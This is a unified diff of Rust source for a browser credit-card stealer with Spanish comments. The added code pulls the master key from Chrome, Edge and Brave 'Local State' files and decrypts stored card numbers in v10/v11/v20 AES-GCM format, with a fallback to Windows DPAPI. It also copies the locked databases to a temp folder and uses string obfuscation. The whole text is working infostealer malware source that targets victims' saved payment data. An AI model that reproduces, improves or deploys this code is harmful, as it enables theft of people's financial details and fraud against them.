@@ -1,6 +1,6 @@
 // Stealer de tarjetas de crédito y autofill data de browsers
 use crate::stealer::common::get_appdata_local;
-use crate::stealer::chromium::decrypt_value_dpapi;
+use crate::stealer::chromium::{decrypt_value_dpapi, extract_master_key, decrypt_aes_gcm_bytes};
 use rusqlite::Connection;
 use std::path::PathBuf;
 use obfstr::obfstr;
@@ -194,7 +194,7 @@ pub fn steal_credit_cards() -> Vec<CreditCard> {
                     
                     if profile_path.exists() {
                         if let Some(temp_path) = copy_to_temp(&profile_path) {
-                            let mut profile_cards = extract_credit_cards(&temp_path, &format!("{} ({})", browser.name, profile_name));
+                            let mut profile_cards = extract_credit_cards(&temp_path, &format!("{} ({})", browser.name, profile_name), None);
                             all_cards.append(&mut profile_cards);
                             std::fs::remove_file(&temp_path).ok();
                         }
@@ -216,10 +216,25 @@ fn steal_credit_cards_from_browser(browser: &BrowserConfig) -> Option<Vec<Credit
         return None;
     }
     
+    // Extraer master key de Local State para v10/v11/v20 (AES-GCM)
+    let master_key = if browser.name == "Chrome" || browser.name == "Edge" || browser.name == "Brave" {
+        let local_state_path = if browser.name == "Edge" {
+            local_appdata.join(r"Microsoft\Edge\User Data\Local State")
+        } else if browser.name == "Chrome" {
+            local_appdata.join(r"Google\Chrome\User Data\Local State")
+        } else {
+            local_appdata.join(r"BraveSoftware\Brave-Browser\User Data\Local State")
+        };
+        
+        extract_master_key(&local_state_path).ok().flatten()
+    } else {
+        None
+    };
+    
     // Copiar base de datos a temp (porque puede estar bloqueada)
     let temp_path = copy_to_temp(&web_data_path)?;
     
-    let cards = extract_credit_cards(&temp_path, browser.name);
+    let cards = extract_credit_cards(&temp_path, browser.name, master_key.as_deref());
     
     // Eliminar archivo temporal
     std::fs::remove_file(&temp_path).ok();
@@ -228,7 +243,7 @@ fn steal_credit_cards_from_browser(browser: &BrowserConfig) -> Option<Vec<Credit
 }
 
 /// Extrae tarjetas de crédito de la base de datos Web Data
-fn extract_credit_cards(db_path: &PathBuf, browser_name: &str) -> Vec<CreditCard> {
+fn extract_credit_cards(db_path: &PathBuf, browser_name: &str, master_key: Option<&[u8]>) -> Vec<CreditCard> {
     let mut cards = Vec::new();
     
     // 🔍 DEBUG: Log file
@@ -243,6 +258,7 @@ fn extract_credit_cards(db_path: &PathBuf, browser_name: &str) -> Vec<CreditCard
         use std::io::Write;
         let _ = writeln!(f, "    Extrayendo tarjetas de: {}", browser_name);
         let _ = writeln!(f, "    DB Path: {:?}", db_path);
+        let _ = writeln!(f, "    Master key disponible: {}", master_key.is_some());
     }
     
     let conn = match Connection::open(db_path) {
@@ -337,13 +353,15 @@ fn extract_credit_cards(db_path: &PathBuf, browser_name: &str) -> Vec<CreditCard
                         }
                         let _ = writeln!(f, "");
                         
-                        // Verificar formato (v10/v11 = AES-GCM, sin prefijo = DPAPI directo)
+                        // Verificar formato (v10/v11/v20 = AES-GCM, sin prefijo = DPAPI directo)
                         if encrypted_number.len() >= 3 {
                             if &encrypted_number[0..3] == b"v10" {
                                 let _ = writeln!(f, "      ⚠️ Formato: v10 (AES-256-GCM) - Necesita master key");
                             } else if &encrypted_number[0..3] == b"v11" {
                                 let _ = writeln!(f, "      ⚠️ Formato: v11 (AES-256-GCM) - Necesita master key");
-                            } else if &encrypted_number[0..5] == b"DPAPI" {
+                            } else if &encrypted_number[0..3] == b"v20" {
+                                let _ = writeln!(f, "      ⚠️ Formato: v20 (AES-256-GCM MODERNO) - Necesita master key");
+                            } else if encrypted_number.len() >= 5 && &encrypted_number[0..5] == b"DPAPI" {
                                 let _ = writeln!(f, "      ℹ️ Formato: DPAPI con prefijo");
                             } else {
                                 let _ = writeln!(f, "      ℹ️ Formato: DPAPI directo (raw bytes)");
@@ -352,11 +370,49 @@ fn extract_credit_cards(db_path: &PathBuf, browser_name: &str) -> Vec<CreditCard
                     }
                 }
                 
-                // Desencriptar número de tarjeta con DPAPI
-                if let Some(decrypted) = decrypt_value_dpapi(&encrypted_number) {
+                // Intentar desencriptar
+                let mut decrypted_bytes: Option<Vec<u8>> = None;
+                
+                // 1. Intentar AES-256-GCM si tenemos master key y es formato v10/v11/v20
+                if let Some(key) = master_key {
+                    if encrypted_number.len() >= 3 {
+                        let prefix = &encrypted_number[0..3];
+                        if prefix == b"v10" || prefix == b"v11" || prefix == b"v20" {
+                            if let Some(ref mut f) = log {
+                                use std::io::Write;
+                                let _ = writeln!(f, "      🔑 Intentando AES-256-GCM con master key...");
+                            }
+                            
+                            if let Some(decrypted) = decrypt_aes_gcm_bytes(&encrypted_number, key) {
+                                if let Some(ref mut f) = log {
+                                    use std::io::Write;
+                                    let _ = writeln!(f, "      ✅ AES-256-GCM decrypt OK, bytes: {}", decrypted.len());
+                                }
+                                decrypted_bytes = Some(decrypted);
+                            } else {
+                                if let Some(ref mut f) = log {
+                                    use std::io::Write;
+                                    let _ = writeln!(f, "      ❌ AES-256-GCM decrypt failed");
+                                }
+                            }
+                        }
+                    }
+                }
+                
+                // 2. Fallback a DPAPI si AES-GCM no funcionó
+                if decrypted_bytes.is_none() {
                     if let Some(ref mut f) = log {
                         use std::io::Write;
-                        let _ = writeln!(f, "      ✅ DPAPI decrypt OK, bytes: {}", decrypted.len());
+                        let _ = writeln!(f, "      🔑 Intentando DPAPI...");
+                    }
+                    decrypted_bytes = decrypt_value_dpapi(&encrypted_number);
+                }
+                
+                // Procesar bytes desencriptados
+                if let Some(decrypted) = decrypted_bytes {
+                    if let Some(ref mut f) = log {
+                        use std::io::Write;
+                        let _ = writeln!(f, "      ✅ Desencriptación exitosa, bytes: {}", decrypted.len());
                         
                         // Mostrar bytes desencriptados
                         if decrypted.len() > 0 {
@@ -405,12 +461,13 @@ fn extract_credit_cards(db_path: &PathBuf, browser_name: &str) -> Vec<CreditCard
                 } else {
                     if let Some(ref mut f) = log {
                         use std::io::Write;
-                        let _ = writeln!(f, "      ❌ DPAPI decrypt failed - CryptUnprotectData retornó error");
+                        let _ = writeln!(f, "      ❌ Desencriptación fallida (AES-GCM y DPAPI)");
                         let _ = writeln!(f, "      💡 Posibles causas:");
                         let _ = writeln!(f, "         - Windows Defender bloqueando DPAPI");
                         let _ = writeln!(f, "         - Diferente usuario encriptó los datos");
                         let _ = writeln!(f, "         - Tarjeta protegida por Microsoft Account");
-                        let _ = writeln!(f, "         - Formato v10/v11 (AES-GCM) requiere master key");
+                        let _ = writeln!(f, "         - Master key incorrecta o no disponible");
+                        let _ = writeln!(f, "         - Formato desconocido (no v10/v11/v20/DPAPI)");
                     }
                 }
             } else {
